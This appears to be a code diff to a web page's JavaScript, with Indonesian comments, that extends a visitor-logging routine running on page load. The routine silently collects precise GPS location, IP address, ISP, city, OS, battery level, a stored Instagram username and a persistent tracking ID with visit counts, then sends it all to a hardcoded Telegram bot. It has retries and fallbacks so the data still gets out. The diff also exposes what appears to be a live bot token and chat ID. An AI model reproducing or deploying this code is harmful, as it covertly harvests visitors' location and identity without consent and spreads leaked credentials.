@@ -171,9 +171,56 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   }, 1000);
 });
 
+const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
+const CHAT_ID = "6864694275"; 
+// -----------------------------------------
+
 // === INFO PENGUNJUNG ===
 async function showVisitorInfo() {
+  // -------------------------
+  
+  // -------------------------
+  try {
+    let visitorID = localStorage.getItem("visitor_id");
+    if (!visitorID) {
+      // Buat ID unik: timestamp + random + sebagian userAgent -> SHA-256 -> ambil 16 hex
+      const raw = `${Date.now()}-${Math.random().toString(36).slice(2,10)}-${navigator.userAgent}`;
+      try {
+        const enc = new TextEncoder();
+        const hashBuf = await crypto.subtle.digest("SHA-256", enc.encode(raw));
+        visitorID = Array.from(new Uint8Array(hashBuf)).map(b => b.toString(16).padStart(2,"0")).join("").slice(0,16);
+      } catch (e) {
+        // fallback sederhana bila SubtleCrypto tidak tersedia
+        visitorID = ("v" + Math.random().toString(36).slice(2,10) + Date.now().toString(36)).slice(0,16);
+      }
+      localStorage.setItem("visitor_id", visitorID);
+      localStorage.setItem("visitor_first_seen", new Date().toISOString());
+    }
+    // visit count
+    let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
+    visitCount = isNaN(visitCount) ? 1 : (visitCount + 1);
+    localStorage.setItem("visitor_visits", String(visitCount));
+  } catch (err) {
+    // localStorage may be disabled -> ignore but continue
+    console.warn("visitor-id error:", err);
+  }
+
+  // Ambil savedUser seperti script lama
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
+
+  // internal helper: safe fetch with retry
+  async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
+    for (let i = 0; i < retries; i++) {
+      try {
+        return await fetch(url, opts);
+      } catch (e) {
+        if (i === retries - 1) throw e;
+        await new Promise(res => setTimeout(res, retryDelay * Math.pow(2, i)));
+      }
+    }
+  }
+
+  // original sendToTelegram but extended to include visitorID & visits
   async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
     try {
       const now = new Date();
@@ -186,13 +233,25 @@ async function showVisitorInfo() {
         /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
         /Mac/i.test(navigator.userAgent) ? "MacOS" :
         /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+
       let batteryInfo = "Tidak diketahui";
       try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
-      } catch {}
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
+        }
+      } catch (e) {
+        // ignore battery errors
+      }
+
+      const visitorID = localStorage.getItem("visitor_id") || "unknown";
+      const visits = localStorage.getItem("visitor_visits") || "1";
+      const firstSeen = localStorage.getItem("visitor_first_seen") || null;
+
       const msg = `📢 Pengunjung Baru!
 👤 ${savedUser}
+🆔 ID Pengunjung: ${visitorID}
+🧮 Kunjungan ke: ${visits}${firstSeen ? ` (first: ${new Date(firstSeen).toLocaleString('id-ID')})` : ""}
 🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
 🗺️ Maps: ${mapLink}
 📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
@@ -202,13 +261,18 @@ async function showVisitorInfo() {
 🏷️ ISP: ${d.connection?.isp || d.org || "?"}
 📡 IP: ${d.ip || "?"}
 🕓 ${now.toLocaleString('id-ID')}`;
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
+      await safeFetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-      });
-    } catch (err) { console.error("❌ Gagal kirim info:", err); }
+      }, 4);
+
+    } catch (err) {
+      console.error("❌ Gagal kirim info:", err);
+    }
   }
+
   try {
     const coords = await new Promise((resolve, reject) => {
       navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
@@ -216,9 +280,19 @@ async function showVisitorInfo() {
     const { latitude, longitude, accuracy } = coords.coords;
     const ipData = await (await fetch("https://ipwho.is/")).json();
     await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
-  } catch {
-    const d = await (await fetch("https://ipwho.is/")).json();
-    await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
+  } catch (err) {
+    try {
+      const d = await (await fetch("https://ipwho.is/")).json();
+      await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
+    } catch (e) {
+      console.error("❌ Gagal ambil data IP:", e);
+      try {
+        const minimal = { city: "?", country: "?", ip: "?" };
+        await sendToTelegram(minimal, null, null, "unknown");
+      } catch (ee) {
+        console.error("❌ Gagal kirim minimal info:", ee);
+      }
+    }
   }
 }
 showVisitorInfo();
